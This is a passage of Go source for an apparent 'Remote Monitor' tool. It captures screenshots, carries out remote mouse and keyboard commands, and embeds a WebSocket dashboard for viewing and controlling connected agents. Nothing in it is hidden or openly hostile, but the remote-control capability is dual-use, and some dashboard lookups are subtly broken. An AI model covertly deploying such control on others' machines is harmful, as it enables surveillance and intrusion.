		x := int(parseFloat(params["x"]) / 100 * float64(sw))
		y := int(parseFloat(params["y"]) / 100 * float64(sh))
		if cmd == "mousemove" { moveMouse(x, y) } else { clickMouse(x, y, params["button"] == "2") }
	} else if cmd == "keypress" { pressKey(params["key"]) }
}

func parseFloat(s string) float64 { var f float64; fmt.Sscanf(s, "%f", &f); return f }

func capture() string {
	if screenshot.NumActiveDisplays() == 0 { return "" }
	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
	if err != nil { return "" }
	b := new(bytes.Buffer)
	jpeg.Encode(b, img, &jpeg.Options{Quality: 50})
	return base64.StdEncoding.EncodeToString(b.Bytes())
}

// Embedded dashboard HTML
var htmlDashboard = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Remote Monitor</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#0f0f23;color:#fff;height:100vh}
header{background:#1a1a3e;padding:15px 20px;display:flex;justify-content:space-between;border-bottom:1px solid #2a2a5e}
h1{font-size:20px;color:#7c7cf0}
#agents{width:300px;min-width:300px;background:#15153a;padding:15px;overflow-y:auto;border-right:1px solid #2a2a5e;height:calc(100vh-60px);float:left}
.agent{background:#1e1e4a;border:1px solid #2a2a5e;border-radius:8px;padding:12px;margin-bottom:8px;cursor:pointer;transition:.2s}
.agent:hover,.agent.selected{border-color:#7c7cf0;background:#252558}
.agent .name{font-weight:600;font-size:14px}
.agent .id{font-size:11px;color:#666;font-family:monospace}
#viewer{margin-left:300px;display:flex;flex-direction:column;height:calc(100vh-60px);background:#0a0a20}
#viewer-header{padding:10px 15px;background:#1a1a3e;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #2a2a5e}
#viewer-header button{background:#2a2a5e;color:#fff;border:1px solid #3a3a7e;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:12px}
#viewer-header button.active{background:#7c7cf0;border-color:#7c7cf0}
#viewer-header button.readonly-hidden{display:none}
#screen{flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden}
#screen img{max-width:100%;max-height:100%;object-fit:contain}
</style></head><body>
<header><h1>🖥 Remote Monitor <span id="mode"></span></h1><span id="status">Disconnected</span></header>
<div id="agents"></div><div id="viewer">
<div id="viewer-header"><span id="vname">Select a device</span>
<div><button id="btn-view">View</button><button id="btn-control" class="readonly-hidden">Control</button></div></div>
<div id="screen"><p style="color:#444">Select a device from the list</p></div></div>
<script>
var isRO='<USER>'!='<USER>'||location.hostname!='localhost'&&location.hostname!='127.0.0.1'
var sel=null,viewing=false,ctrl=false,dc=null
var w=new WebSocket((location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=TOKEN_PLACEHOLDER')
w.onopen=function(){document.getElementById('status').textContent='Connected'}
w.onmessage=function(e){
 var d=JSON.parse(e.data)
 if(d.type=='agent-list')render(d.agents)
 if(d.type=='agent-connected')addAgent(d.agentId,d.name)
 if(d.type=='agent-disconnected')removeAgent(d.agentId)
 if(d.type=='frame'&&d.agentId==sel){document.getElementById('screen').innerHTML='<img src="data:image/jpeg;base64,'+d.frame+'">'}
}
function render(agents){var el=document.getElementById('agents');el.innerHTML='';agents.forEach(function(a){addAgent(a.id,a.name)})}
function addAgent(id,name){var d=document.createElement('div');d.className='agent';d.innerHTML='<div class="name">'+name+'</div><div class="id">'+id+'</div>';d.onclick=function(){select(id)};document.getElementById('agents').appendChild(d)}
function removeAgent(id){var el=document.querySelector('[data-id="'+id+'"]');if(el)el.remove()}
function select(id){sel=id;document.querySelectorAll('.agent').forEach(function(e){e.classList.remove('selected')});var el=document.querySelector('[data-id="'+id+'"]');if(el)el.classList.add('selected');document.getElementById('vname').textContent=id;document.getElementById('screen').innerHTML='<p style="color:#444">Click View to start</p>'}
document.getElementById('btn-view').onclick=function(){if(!sel)return;viewing=!viewing;w.send(JSON.stringify({type:viewing?'view-agent':'stop-viewing',agentId:sel}));this.textContent=viewing?'Viewing...':'View'}
document.getElementById('btn-control').onclick=function(){if(!sel||!viewing)return;ctrl=!ctrl;this.textContent=ctrl?'Stop Control':'Control';this.classList.toggle('active')}
document.getElementById('screen').addEventListener('mousemove',function(e){if(!ctrl||!sel)return;var r=this.getBoundingClientRect();w.send(JSON.stringify({type:'control',agentId:sel,command:'mousemove',params:{x:((e.clientX-r.left)/r.width*100).toFixed(2),y:((e.clientY-r.top)/r.height*100).toFixed(2)}}))})
document.getElementById('screen').addEventListener('click',function(e){if(!ctrl||!sel)return;var r=this.getBoundingClientRect();w.send(JSON.stringify({type:'control',agentId:sel,command:'click',params:{x:((e.clientX-r.left)/r.width*100).toFixed(2),y:((e.clientY-r.top)/r.height*100).toFixed(2),button:e.button}}))})
if(isRO){document.getElementById('mode').textContent='(view-only)';document.getElementById('btn-control').style.display='none'}
</script></body></html>`
